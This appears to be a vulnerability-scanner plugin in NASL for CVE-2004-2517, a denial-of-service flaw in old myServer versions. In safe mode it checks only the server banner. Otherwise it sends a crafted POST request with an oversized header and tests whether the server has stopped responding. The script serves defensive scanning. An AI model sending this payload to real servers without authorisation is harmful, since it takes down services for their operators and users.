# SPDX-FileCopyrightText: 2004 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14838");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"OSVDB", value:"10333");
  script_cve_id("CVE-2004-2517");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("myServer POST Denial of Service");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("MyServer/banner");
  script_exclude_keys("www/too_long_url_crash");
  script_require_ports("Services/www", 80);

  script_tag(name:"solution", value:"Upgrade to the latest version of this software or use another web serve.r");

  script_tag(name:"summary", value:"This version of myServer is vulnerable to remote denial of service attack.");

  script_tag(name:"impact", value:"With a specially crafted HTTP POST request, an attacker can cause the service
  to stop responding.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
banner = http_get_remote_headers(port:port);
if(!banner || "MyServer" >!< banner)
  exit(0);

if(safe_checks()) {
  #Server: MyServer 0.7.1
  if(egrep(pattern:"^Server: *MyServer 0\.([0-6]\.|7\.[01])[^0-9]", string:banner)) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
} else {

  if(http_is_dead(port:port))
    exit(0);

  data = http_post(item:string("index.html?View=Logon HTTP/1.1\r\n", crap(520), ": ihack.ms\r\n\r\n"), port:port);
  soc = http_open_socket(port);
  if(!soc)
    exit(0);

  send(socket:soc, data:data);
  http_close_socket(soc);
  sleep(1);
  soc2 = http_open_socket(port);
  if(!soc2) {
    security_message(port:port);
  } else {
    http_close_socket(soc2);
  }
}

exit(99);
